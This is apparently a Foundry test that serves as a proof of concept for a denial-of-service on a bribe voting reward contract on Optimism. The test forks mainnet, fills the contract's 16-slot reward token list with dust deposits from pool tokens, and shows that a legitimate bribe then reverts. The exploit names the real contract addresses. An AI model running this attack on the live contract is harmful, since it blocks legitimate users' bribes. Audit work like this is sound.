// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBribeVotingReward {
    function notifyRewardAmount(address token, uint256 amount) external;
    function rewardsListLength() external view returns (uint256);
    function rewards(uint256 index) external view returns (address);
}

interface IVoter {
    function pools(uint256 index) external view returns (address);
    function length() external view returns (uint256);
}

interface IPool {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract BribeDoSTest is Test {
    address constant BRIBE = 0xd57e9480234F2ac9321a48d875688827d2271451;
    address constant VOTER = 0x41C914ee0c7E1A5edCD0295623e6dC557B5aBf3C;

    function setUp() public {
        vm.createSelectFork("https://mainnet.optimism.io", 131000000);
    }

    function testBribeDoS() public {
        address attacker = address(0xbad);
        uint256 initialLength = IBribeVotingReward(BRIBE).rewardsListLength();
        console.log("Initial rewards length:", initialLength);

        uint256 poolsCount = IVoter(VOTER).length();

        for (uint256 i = 0; i < poolsCount; i++) {
            if (IBribeVotingReward(BRIBE).rewardsListLength() >= 16) break;

            address pool = IVoter(VOTER).pools(i);
            address t0 = IPool(pool).token0();
            address t1 = IPool(pool).token1();

            tryAdd(attacker, t0);
            if (IBribeVotingReward(BRIBE).rewardsListLength() < 16) {
                tryAdd(attacker, t1);
            }
        }

        uint256 finalLength = IBribeVotingReward(BRIBE).rewardsListLength();
        console.log("Final rewards length:", finalLength);
        assertEq(finalLength, 16, "Should have reached the limit of 16 tokens");

        // Legitimate bribe token (find one more)
        address extraToken = address(0);
        for (uint256 i = 0; i < poolsCount; i++) {
            address pool = IVoter(VOTER).pools(i);
            address t0 = IPool(pool).token0();
            if (!isAlreadyIn(t0)) {
                extraToken = t0;
                break;
            }
        }

        if (extraToken != address(0)) {
            address user = address(0x123);
            deal(extraToken, user, 1 ether);
            vm.startPrank(user);
            IERC20(extraToken).approve(BRIBE, 1 ether);

            console.log("Legitimate user tries to add bribe with token:", extraToken);
            vm.expectRevert();
            IBribeVotingReward(BRIBE).notifyRewardAmount(extraToken, 1 ether);
            vm.stopPrank();
            console.log("Legitimate bribe failed. DoS successful.");
        }
    }

    function isAlreadyIn(address token) internal view returns (bool) {
        uint256 len = IBribeVotingReward(BRIBE).rewardsListLength();
        for (uint256 j = 0; j < len; j++) {
            if (IBribeVotingReward(BRIBE).rewards(j) == token) return true;
        }
        return false;
    }

    function tryAdd(address attacker, address token) internal {
        if (isAlreadyIn(token)) return;

        deal(token, attacker, 1 ether);
        vm.startPrank(attacker);
        IERC20(token).approve(BRIBE, 1 ether);

        try IBribeVotingReward(BRIBE).notifyRewardAmount(token, 1) {
            console.log("Successfully added token:", token);
        } catch {
            // Failed
        }
        vm.stopPrank();
    }
}
